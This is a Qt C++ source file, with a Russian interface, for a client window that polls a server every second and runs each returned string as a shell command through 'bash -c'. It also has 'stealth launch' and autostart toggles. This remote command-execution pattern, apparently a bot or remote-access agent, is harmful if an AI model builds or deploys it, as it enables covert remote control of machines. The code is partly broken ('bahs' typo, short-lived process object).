#include <filesystem>
#include <iostream>
#include <QProcess>
#include <QString>

#include "ui_main_window.h"
#include "ui_start_window.h"
#include "windows/main_window.h"
#include "windows/start_window.h"

#include "services/jwt.h"

void MainWindow::display_commands(QTimer* timer, QLabel* label) {
    qDebug() << "запуск дисплея";
    connect(timer, &QTimer::timeout, this, [label, this]() {
        if (const auto result = requests.get_command(token); result.has_value()) {
            const QString commnad = QString::fromStdString(result.value());
            label->setText("Список команд: " + commnad);

            QProcess process;
            process.start("bahs", QStringList() << "-c" << commnad);
        } else {
            label->setText("Список команд: пуст");
        }
    });

    timer->start(1000);
}

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow) {

    token = Jwt::get_token();

    if (token.empty()) {
        return;
    }

    ui->setupUi(this);


    if (requests.server_status() == true) {
        ui->display_connection_status->setText("Статус сети: подключено к серверу");
    } else {
        ui->display_connection_status->setText("Статус сети: не подключено к серверу");
    }

    QTimer* display_timer = new QTimer(this);
    display_commands(display_timer, ui->display_commands);
}

MainWindow::~MainWindow() {
    delete ui;
}


void MainWindow::on_automatic_start_toggled(const bool checked) {
    is_automatic_start_enabled = checked;
}

void MainWindow::on_stealth_launch_toggled(const bool checked) {
    is_hidden_start = checked;
}

void MainWindow::on_button_logout_clicked() {
    if (std::filesystem::exists("data.bin")) {
        std::filesystem::remove("data.bin");

        auto* start_window = new StartWindow();

        start_window->setAttribute(Qt::WA_DeleteOnClose);
        start_window->show();
        this->close();
    }
}